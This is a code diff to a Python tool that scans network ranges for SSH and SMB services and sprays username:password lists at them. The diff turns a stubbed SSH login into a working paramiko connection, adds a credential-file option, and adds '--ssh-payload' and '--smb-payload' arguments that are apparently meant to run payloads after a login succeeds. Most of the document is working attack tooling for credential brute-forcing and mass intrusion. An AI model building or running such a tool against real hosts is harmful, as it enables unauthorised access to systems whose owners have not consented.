@@ -4,16 +4,20 @@ import os
 import random
 import asyncio
 import argparse
-
+import paramiko
 
 from ipaddress import ip_network
 from concurrent.futures import ThreadPoolExecutor
 from typing import List, Tuple, Dict
 
 
-DEFAULT_PORTS = {
-    'ssh': 22,
-    'smb': 445
+SERVICES = {
+    'ssh': {
+        'port': 22
+    },
+    'smb': {
+        'port': 445,
+    }
 }
 
 
@@ -80,8 +84,7 @@ class LoginScanner(object):
 
 class SSHLoginScanner(LoginScanner):
 
-    async def start(self):
-
+    async def scan(self):
         tasks = []
         tasks.append(asyncio.create_task(self._producer()))
         for _ in range(self.max_workers):
@@ -116,7 +119,14 @@ class SSHLoginScanner(LoginScanner):
     @staticmethod
     def login_attempt(ip: str, port: int, username: str, password: str) -> bool:
         print('[ssh worker] Login attempt %s@%s:%d (pw: %s)' % (username, ip, port, password))
-        return True
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        try:
+            ssh.connect(ip, port=port, username=username, password=password)
+            return True
+        except Exception as err:
+            print('[paramiko] %s (%s)' % (err, type(err)))
+        return False
 
 
 class SMBLoginScanner(LoginScanner):
@@ -125,18 +135,26 @@ class SMBLoginScanner(LoginScanner):
 
 
 
+def load_credentials(args) -> List[Tuple[str, str]]:
+    with open(args.credentials) as fp:
+        lines = [line.strip() for line in fp.readlines()]
+    return [line.split(':', 1) for line in lines]
+
+
 async def main(args):
+    credentials = load_credentials(args)
+
     # Create per-port/service queues
-    ports = [DEFAULT_PORTS[service] for service in args.services]
+    ports = [SERVICES[service]['port'] for service in args.services]
     open_queues = dict((port, asyncio.Queue(),) for port in ports)
 
     # Start the TCP scanner
     tcp_scanner = TCPScanner(open_queues, args.timeout)
     tcp_scan = asyncio.create_task(tcp_scanner.scan(args.targets))
 
-    ssh_queue = open_queues[DEFAULT_PORTS['ssh']]
-    ssh_scanner = SSHLoginScanner(ssh_queue, [('root', 'toor')], tcp_scanner.tcp_scan_completed)
-    ssh_scan = asyncio.create_task(ssh_scanner.start())
+    ssh_queue = open_queues[SERVICES['ssh']['port']]
+    ssh_scanner = SSHLoginScanner(ssh_queue, credentials, tcp_scanner.tcp_scan_completed)
+    ssh_scan = asyncio.create_task(ssh_scanner.scan())
 
     await tcp_scan
     print('[*] TCP scan completed')
@@ -151,7 +169,7 @@ class ValidatServicesAction(argparse.Action):
 
     def __call__(self, parser, namespace, values, option_string=None):
         for service in values:
-            if service not in DEFAULT_PORTS:
+            if service not in SERVICES:
                 raise ValueError('Unsupported service %s' % service)
         setattr(namespace, self.dest, values)
 
@@ -183,12 +201,27 @@ if __name__ == '__main__':
         nargs='*',
         required=True,
     )
+    parser.add_argument('--credentials', '-c',
+        help='credential file (username:password newline delimited)',
+        dest='credentials',
+        required=True,
+    )
     parser.add_argument('--services', '-s',
         help='list of services to scan/spray',
         dest='services',
         nargs='*',
-        default=list(DEFAULT_PORTS.keys()),
+        default=list(SERVICES.keys()),
         action=ValidatServicesAction
+    )
+    parser.add_argument('--ssh-payload', '-ssh',
+        help='',
+        dest='ssh_payload',
+        default=None,
+    )
+    parser.add_argument('--smb-payload', '-smb',
+        help='',
+        dest='smb_payload',
+        default=None,
     )
     asyncio.run(main(parser.parse_args()))
 
